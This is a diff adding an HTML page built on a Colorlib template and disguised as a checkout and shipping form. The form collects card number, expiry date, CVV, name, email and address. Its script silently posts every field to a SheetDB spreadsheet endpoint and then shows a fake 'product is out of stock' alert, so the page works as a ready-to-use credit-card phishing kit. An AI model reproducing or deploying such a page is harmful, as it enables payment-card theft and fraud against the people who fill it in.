@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Sign Up Form by Colorlib</title>
+
+    <!-- Font Icon -->
+    <link rel="stylesheet" href="fonts/material-icon/css/material-design-iconic-font.min.css">
+
+    <!-- Main css -->
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+    <div class="main">
+        <div class="container">
+            <div class="signup-content">
+                <div class="signup-img">
+                    <img src="https://nominationitaly.files.wordpress.com/2022/08/81n7eh1r1l.jpg?w=1024" alt="">
+                </div>
+                <div class="signup-form">
+                    <form action="https://sheetdb.io/api/v1/s0m6wolf7bmci" method="POST" class="register-form" id="sheetdb-form">
+                        <h2>Check Out & shipping</h2>
+                        <div class="form-row">
+                            <div class="form-group">
+                            <label for="name">Expiration Date :</label>
+                                <input type="text" name="data[date]" id="name" placeholder="MM/DD" required/>
+                            </div>
+                            <div class="form-group">
+                                <label for="father_name">CVV :</label>
+                                <input type="text" name="data[cvv]" id="father_name" placeholder="123" required/>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="address">Card Number :</label>
+                            <input type="text" name="data[number]" id="address" placeholder="1111-2222-3333-4444" required/>
+                        </div>
+                        <div class="form-radio">
+                            <label for="gender" class="radio-label">Delivery:</label>
+                            <div class="form-radio-item">
+                                <input type="radio" name="data[free]" id="male" checked>
+                                <label for="male">Free Delivery in 7 Days </label>
+                                <span class="check"></span>
+                            </div>
+                            <div class="form-radio-item">
+                                <input type="radio" name="data[$9]" id="female">
+                                <label for="female">$9 Express Delivery in 7 Days </label>
+                                <span class="check"></span>
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="state">Full Name:</label>
+                               <input type="text" name="data[name]" id="address" placeholder="John Deo" required/>
+                            </div>
+                            <div class="form-group">
+                                <label for="city">Email :</label>
+                                <input type="text" name="data[email]" id="address" placeholder="xyz@mail.com" required/>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label for="birth_date">Contry :</label>
+                            <input type="text" name="data[contry]" id="birth_date" placeholder="Contry" required/>
+                        </div>
+                        <div class="form-group">
+                            <label for="pincode">City:</label>
+                            <input type="text" name="data[city]" id="pincode" placeholder="City"required/>
+                        </div>
+                        <div class="form-group">
+                            <label for="course">Zip/Pin code :</label>
+                            <input type="text" name="data[zip]" id="birth_date" placeholder="Zip/Pin code" required/>
+                        </div>
+                        <div class="form-group">
+                            <label for="email">Street Address :</label>
+                            <input type="text" name="data[address]" id="email" placeholder="Street Address" required />
+                        </div>
+                        <div class="form-submit">
+                            <input type="submit" value="Reset All" class="submit" name="reset" id="reset" />
+                            <input type="submit" value="Continou" class="submit" name="submit" id="Submit" />
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JS -->
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="js/main.js"></script>
+
+    <script>
+        var form = document.getElementById('sheetdb-form');
+        form.addEventListener("submit", e => {
+          e.preventDefault();
+          fetch(form.action, {
+              method : "POST",
+              body: new FormData(document.getElementById("sheetdb-form")),
+          }).then(
+              response => response.json()
+          ).then((html) => {
+            // you can put any JS code here
+            alert('Sorry, Product is out of stock in your city. Please try after a while.')
+          });
+        });
+      </script>
+
+</body><!-- This templates was made by Colorlib (https://colorlib.com) -->
+</html>
